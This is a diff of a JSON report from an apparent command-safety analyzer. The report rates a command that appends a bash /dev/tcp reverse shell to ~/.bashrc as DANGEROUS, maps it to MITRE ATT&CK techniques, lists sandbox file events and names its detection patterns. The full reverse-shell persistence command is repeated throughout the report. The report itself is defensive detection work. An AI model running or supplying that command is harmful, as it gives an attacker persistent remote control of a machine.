@@ -1,185 +1,303 @@
 {
-  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
-  "version": "2.1.0",
-  "runs": [
+  "version": "4.1",
+  "command": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc",
+  "timestamp": "2026-03-20T03:46:31.470942+00:00",
+  "verdict": "DANGEROUS",
+  "risk_score": 100,
+  "confidence": "HIGH",
+  "recommendations": [
+    "BLOCK: 强烈建议阻止此命令执行",
+    "检查网络连接: ss -tunap | grep ESTABLISHED"
+  ],
+  "is_legitimate_pattern": false,
+  "findings_summary": {
+    "total": 5,
+    "critical": 4,
+    "warn": 1,
+    "info": 0,
+    "dimensions_hit": 3
+  },
+  "findings": [
     {
-      "tool": {
-        "driver": {
-          "name": "Command Safety Analyzer",
-          "version": "4.1",
-          "informationUri": "https://github.com/command-safety-analyzer",
-          "rules": [
-            {
-              "id": "T1059.004",
-              "name": "静态分析",
-              "shortDescription": {
-                "text": "命令匹配恶意模式: reverse shell via /dev/tcp"
-              },
-              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
-              "properties": {
-                "tags": [
-                  "security",
-                  "command-safety",
-                  "mitre/T1059.004"
-                ]
-              },
-              "help": {
-                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
-              }
-            },
-            {
-              "id": "T1059.004-1",
-              "name": "静态分析",
-              "shortDescription": {
-                "text": "命令匹配恶意模式: interactive bash reverse shell"
-              },
-              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
-              "properties": {
-                "tags": [
-                  "security",
-                  "command-safety",
-                  "mitre/T1059.004"
-                ]
-              },
-              "help": {
-                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
-              }
-            },
-            {
-              "id": "T1546.004",
-              "name": "Shell环境",
-              "shortDescription": {
-                "text": "Shell 配置文件被修改"
-              },
-              "helpUri": "https://attack.mitre.org/techniques/T1546/004",
-              "properties": {
-                "tags": [
-                  "security",
-                  "command-safety",
-                  "mitre/T1546.004"
-                ]
-              },
-              "help": {
-                "text": "MITRE ATT&CK: T1546.004 (Event Triggered Execution: .bash_profile/.bashrc)"
-              }
-            },
-            {
-              "id": "T1059.004-3",
-              "name": "内容分析",
-              "shortDescription": {
-                "text": "Shell 配置含恶意内容: reverse shell via /dev/tcp"
-              },
-              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
-              "properties": {
-                "tags": [
-                  "security",
-                  "command-safety",
-                  "mitre/T1059.004"
-                ]
-              },
-              "help": {
-                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
-              }
-            },
-            {
-              "id": "T1059.004-4",
-              "name": "内容分析",
-              "shortDescription": {
-                "text": "Shell 配置含恶意内容: interactive bash reverse shell"
-              },
-              "helpUri": "https://attack.mitre.org/techniques/T1059/004",
-              "properties": {
-                "tags": [
-                  "security",
-                  "command-safety",
-                  "mitre/T1059.004"
-                ]
-              },
-              "help": {
-                "text": "MITRE ATT&CK: T1059.004 (Command and Scripting Interpreter: Unix Shell)"
-              }
-            }
-          ],
-          "properties": {
-            "verdict": "DANGEROUS",
-            "risk_score": 100,
-            "confidence": "HIGH"
-          }
-        }
-      },
-      "results": [
+      "severity": "CRITICAL",
+      "dimension": "静态分析",
+      "description": "命令匹配恶意模式: reverse shell via /dev/tcp",
+      "risk_score": 40,
+      "mitre_attack": [
         {
-          "ruleId": "T1059.004",
-          "level": "error",
-          "message": {
-            "text": "命令匹配恶意模式: reverse shell via /dev/tcp"
-          },
-          "properties": {
-            "risk_score": 40,
-            "dimension": "静态分析",
-            "evidence": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc"
-          }
-        },
-        {
-          "ruleId": "T1059.004-1",
-          "level": "error",
-          "message": {
-            "text": "命令匹配恶意模式: interactive bash reverse shell"
-          },
-          "properties": {
-            "risk_score": 45,
-            "dimension": "静态分析",
-            "evidence": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc"
-          }
-        },
-        {
-          "ruleId": "T1546.004",
-          "level": "warning",
-          "message": {
-            "text": "Shell 配置文件被修改"
-          },
-          "properties": {
-            "risk_score": 20,
-            "dimension": "Shell环境"
-          }
-        },
-        {
-          "ruleId": "T1059.004-3",
-          "level": "error",
-          "message": {
-            "text": "Shell 配置含恶意内容: reverse shell via /dev/tcp"
-          },
-          "properties": {
-            "risk_score": 40,
-            "dimension": "内容分析",
-            "evidence": "reverse shell via /dev/tcp"
-          }
-        },
-        {
-          "ruleId": "T1059.004-4",
-          "level": "error",
-          "message": {
-            "text": "Shell 配置含恶意内容: interactive bash reverse shell"
-          },
-          "properties": {
-            "risk_score": 45,
-            "dimension": "内容分析",
-            "evidence": "interactive bash reverse shell"
-          }
+          "id": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell"
         }
       ],
-      "invocations": [
+      "evidence": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc"
+    },
+    {
+      "severity": "CRITICAL",
+      "dimension": "静态分析",
+      "description": "命令匹配恶意模式: interactive bash reverse shell",
+      "risk_score": 45,
+      "mitre_attack": [
         {
-          "executionSuccessful": true,
-          "properties": {
-            "command": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc",
-            "verdict": "DANGEROUS",
-            "risk_score": 100,
-            "confidence": "HIGH",
-            "timestamp": "2026-03-20T03:00:47.488498+00:00"
-          }
+          "id": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell"
+        }
+      ],
+      "evidence": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc"
+    },
+    {
+      "severity": "WARN",
+      "dimension": "Shell环境",
+      "description": "Shell 配置文件被修改",
+      "risk_score": 20,
+      "mitre_attack": [
+        {
+          "id": "T1546.004",
+          "name": "Event Triggered Execution: .bash_profile/.bashrc"
         }
       ]
+    },
+    {
+      "severity": "CRITICAL",
+      "dimension": "内容分析",
+      "description": "Shell 配置含恶意内容: reverse shell via /dev/tcp",
+      "risk_score": 40,
+      "mitre_attack": [
+        {
+          "id": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell"
+        }
+      ],
+      "evidence": "reverse shell via /dev/tcp"
+    },
+    {
+      "severity": "CRITICAL",
+      "dimension": "内容分析",
+      "description": "Shell 配置含恶意内容: interactive bash reverse shell",
+      "risk_score": 45,
+      "mitre_attack": [
+        {
+          "id": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell"
+        }
+      ],
+      "evidence": "interactive bash reverse shell"
     }
-  ]
+  ],
+  "evidence": {
+    "stdout_lines": 0,
+    "stderr_lines": 0,
+    "exec_duration_sec": 1.0,
+    "external_connections": [],
+    "c2_port_hits": [],
+    "files_added": 1,
+    "files_deleted": 1,
+    "inotify_sys_events": 1,
+    "inotify_tmp_events": 5769,
+    "exit_code": 0,
+    "critical_bins_changed": false,
+    "new_symlinks": 0,
+    "new_file_caps": 0,
+    "permission_issues": [],
+    "mitre_techniques": [
+      "T1059.004",
+      "T1546.004"
+    ]
+  },
+  "dimensions": {
+    "files_added": [
+      "/root/.bashrc"
+    ],
+    "files_deleted": [
+      "/root/.bashrc"
+    ],
+    "inotify_sys_events": [
+      "2026-03-20T03:45:48 MODIFY /root/.bashrc"
+    ],
+    "inotify_tmp_events": [
+      "2026-03-20T03:45:55 CREATE /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz",
+      "2026-03-20T03:45:55 MODIFY /tmp/sortUObiUz"
+    ],
+    "external_connections": [],
+    "suid_new": [],
+    "suid_removed": [],
+    "new_symlinks": [],
+    "new_file_caps": [],
+    "critical_bins_tampered": false,
+    "high_entropy_files": [],
+    "exit_code": 0,
+    "attack_chains": []
+  },
+  "mitre_attack": {
+    "T1059.004": {
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "findings": [
+        "命令匹配恶意模式: reverse shell via /dev/tcp",
+        "命令匹配恶意模式: interactive bash reverse shell",
+        "Shell 配置含恶意内容: reverse shell via /dev/tcp",
+        "Shell 配置含恶意内容: interactive bash reverse shell"
+      ]
+    },
+    "T1546.004": {
+      "name": "Event Triggered Execution: .bash_profile/.bashrc",
+      "findings": [
+        "Shell 配置文件被修改"
+      ]
+    }
+  },
+  "mitre_tactics": {
+    "Execution": [
+      "T1059.004"
+    ],
+    "Persistence": [
+      "T1546.004"
+    ]
+  },
+  "deobfuscation": {
+    "original": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc",
+    "deobfuscated": null,
+    "layers": []
+  },
+  "timeline": [
+    {
+      "phase": "baseline",
+      "time": "1773978327",
+      "desc": "基线采集完成"
+    },
+    {
+      "phase": "probes_start",
+      "time": "1773978349",
+      "desc": "探针启动 + 命令执行开始"
+    },
+    {
+      "phase": "exec_end",
+      "time": "1773978350",
+      "desc": "命令执行结束 (耗时 1.0s, 退出码 0)"
+    },
+    {
+      "phase": "post_snapshot",
+      "time": "1773978391",
+      "desc": "后置快照 + 分析完成"
+    }
+  ],
+  "stdout": [],
+  "stderr": [],
+  "text_summary": "🚨 判定: DANGEROUS (风险分: 100/100, 置信度: HIGH)\n命令: echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc\n\n发现 5 个问题 (4 严重, 1 警告):\n  [CRITICAL] 静态分析: 命令匹配恶意模式: reverse shell via /dev/tcp [T1059.004]\n  [CRITICAL] 静态分析: 命令匹配恶意模式: interactive bash reverse shell [T1059.004]\n  [CRITICAL] 内容分析: Shell 配置含恶意内容: reverse shell via /dev/tcp [T1059.004]\n  [CRITICAL] 内容分析: Shell 配置含恶意内容: interactive bash reverse shell [T1059.004]\n  [WARN] Shell环境: Shell 配置文件被修改 [T1546.004]\n\n涉及 ATT&CK 战术: Execution, Persistence\n\n建议:\n  • BLOCK: 强烈建议阻止此命令执行\n  • 检查网络连接: ss -tunap | grep ESTABLISHED",
+  "fast_triage": {
+    "level": "BLOCK",
+    "static_score": 85,
+    "is_legitimate": false,
+    "blacklisted": true,
+    "patterns_matched": 2,
+    "matches": [
+      {
+        "pattern": "reverse shell via /dev/tcp",
+        "mitre": "T1059.004",
+        "score": 40
+      },
+      {
+        "pattern": "interactive bash reverse shell",
+        "mitre": "T1059.004",
+        "score": 45
+      }
+    ],
+    "deobfuscation_layers": 0
+  }
 }
